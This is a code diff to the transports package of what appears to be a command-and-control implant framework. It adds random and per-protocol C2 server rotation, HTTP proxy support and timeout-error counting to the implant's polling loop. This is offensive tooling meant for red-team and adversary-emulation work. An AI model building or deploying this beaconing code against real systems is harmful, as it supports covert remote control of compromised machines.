@@ -19,10 +19,10 @@ package transports
 */
 
 import (
+	insecureRand "math/rand"
 
 	// {{if or .Config.HTTPc2Enabled .Config.TCPPivotc2Enabled .Config.WGc2Enabled}}
 	"net"
-
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -33,6 +33,7 @@ import (
 	// {{if .Config.WGc2Enabled}}
 	"errors"
 	// {{end}}
+
 	"io"
 	"net/url"
 	"os"
@@ -104,6 +105,10 @@ type Tunnel struct {
 
 	Writer        io.WriteCloser
 	WriteSequence uint64
+}
+
+func init() {
+	insecureRand.Seed(time.Now().UnixNano())
 }
 
 // Tunnel - Add tunnel to mapping
@@ -288,12 +293,43 @@ func GetActiveConnection() *Connection {
 }
 
 func nextCCServer() *url.URL {
-	uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
+	var next string
+	switch "{{.Config.ConnectionStrategy}}" {
+	case "r": // Random
+		next = ccServers[insecureRand.Intn(len(ccServers))]
+	case "rd": // Random Domain
+		next = randomCCDomain(ccServers[*ccCounter%len(ccServers)])
+	case "s": // Sequential
+		next = ccServers[*ccCounter%len(ccServers)]
+	default:
+		next = ccServers[*ccCounter%len(ccServers)]
+	}
 	*ccCounter++
+	uri, err := url.Parse(next)
 	if err != nil {
 		return nextCCServer()
 	}
 	return uri
+}
+
+// randomCCDomain - Random selection within a protocol
+func randomCCDomain(next string) string {
+	uri, err := url.Parse(next)
+	if err != nil {
+		return next
+	}
+	pool := []string{}
+	protocol := uri.Scheme
+	for _, cc := range ccServers {
+		uri, err := url.Parse(cc)
+		if err != nil {
+			continue
+		}
+		if uri.Scheme == protocol {
+			pool = append(pool, cc)
+		}
+	}
+	return pool[insecureRand.Intn(len(pool))]
 }
 
 // GetReconnectInterval - Parse the reconnect interval inserted at compile-time
@@ -523,12 +559,13 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 // {{end}} -WGc2Enabled
 
 // {{if .Config.HTTPc2Enabled}}
-func httpConnect(uri *url.URL) (*Connection, error) {
+func httpConnect(c2URI *url.URL) (*Connection, error) {
 
 	// {{if .Config.Debug}}
-	log.Printf("Connecting -> http(s)://%s", uri.Host)
+	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
 	// {{end}}
-	client, err := HTTPStartSession(uri.Host, uri.Path)
+	proxyConfig := c2URI.Query().Get("proxy")
+	client, err := HTTPStartSession(c2URI.Host, c2URI.Path, proxyConfig)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
@@ -571,37 +608,52 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 
 	go func() {
 		defer connection.Cleanup()
+		errCount := 0 // Number of sequential errors
 		for {
 			select {
 			case <-ctrl:
 				return
 			default:
 				resp, err := client.Poll()
-				switch err := err.(type) {
+				switch errType := err.(type) {
 				case nil:
+					errCount = 0
+					if len(resp) == 0 {
+						continue
+					}
 					envelope := &pb.Envelope{}
-					proto.Unmarshal(resp, envelope)
+					err = proto.Unmarshal(resp, envelope)
 					if err != nil {
+						// {{if .Config.Debug}}
+						log.Printf("failed to decode pb: %s", err)
+						// {{end}}
 						continue
 					}
 					recv <- envelope
-				case net.Error:
-					if err.Timeout() {
+				case *url.Error:
+					errCount++
+					if err, ok := errType.Err.(net.Error); ok && err.Timeout() {
 						// {{if .Config.Debug}}
-						log.Printf("non-fatal error, continue")
+						log.Printf("timeout error #%d", errCount)
 						// {{end}}
-						continue
+						if errCount < maxErrors {
+							continue
+						}
 					}
 					return
-				case *url.Error:
-					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
+				case net.Error:
+					errCount++
+					if errType.Timeout() {
 						// {{if .Config.Debug}}
-						log.Printf("non-fatal error, continue")
+						log.Printf("timeout error #%d", errCount)
 						// {{end}}
-						continue
+						if errCount < maxErrors {
+							continue
+						}
 					}
 					return
 				default:
+					errCount++
 					// {{if .Config.Debug}}
 					log.Printf("[http] error: %#v", err)
 					// {{end}}
